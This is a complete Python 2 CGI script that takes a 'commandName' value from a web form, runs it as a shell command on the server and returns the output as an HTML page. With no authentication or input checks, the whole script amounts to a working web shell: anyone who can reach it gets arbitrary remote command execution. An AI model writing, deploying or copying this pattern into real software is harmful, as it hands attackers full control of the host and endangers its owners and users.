#!/usr/bin/python2
import cgi
import commands

print "Content-Type: text/html"
print 

commandrun=cgi.FormContent()['commandName'][0]
print "<pre>"
l= commands.getstatusoutput(commandrun)
print l[1]
print "</pre>"

